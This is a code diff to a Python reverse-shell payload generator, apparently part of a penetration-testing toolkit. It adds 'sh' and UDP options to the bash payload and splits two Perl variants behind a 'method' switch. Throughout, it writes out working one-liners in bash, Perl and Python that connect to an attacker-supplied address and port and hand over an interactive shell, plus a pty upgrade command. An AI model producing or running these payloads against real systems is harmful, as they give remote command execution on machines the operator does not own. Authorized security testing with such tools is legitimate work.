@@ -377,11 +377,16 @@ def generate_payload(payload_type, local_address, port, index=None, **kwargs):
     commands = []
     shell = kwargs.get("shell", "/bin/bash")
 
-    if payload_type == "bash":
-        payload = f"bash -i >& /dev/tcp/{local_address}/{port} 0>&1"
+    if payload_type in ["sh", "bash"]:
+        protocol = kwargs.get("protocol", "tcp")
+        assert protocol in ["tcp", "udp"]
+        payload = f"{payload_type} -i >& /dev/{protocol}/{local_address}/{port} 0>&1"
     elif payload_type == "perl":
-        payload = f"perl -e 'use Socket;$i=\"{local_address}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/{shell} -i\");}};'"
-        payload = f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{local_address}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+        method = kwargs.get("method", "exec")
+        if method == "exec":
+            payload = f"perl -e 'use Socket;$i=\"{local_address}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/{shell} -i\");}};'"
+        else:
+            payload = f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{local_address}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
     elif re.match(r"python((2|3)(\.[0-9]+)?)?", payload_type):
         payload = f"{payload_type} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local_address}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/{shell}\",\"-i\"]);'"
     elif payload_type == "php":
@@ -528,7 +533,7 @@ if __name__ == "__main__":
 
     if payload is None:
         print("Unknown payload type: %s" % payload_type)
-        print("Supported types: bash, perl, python[2|3], php, ruby, netcat|nc, java, xterm, powershell")
+        print("Supported types: sh, bash, perl, python[2|3], php, ruby, netcat|nc, java, xterm, powershell")
         exit(1)
 
     tty = "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
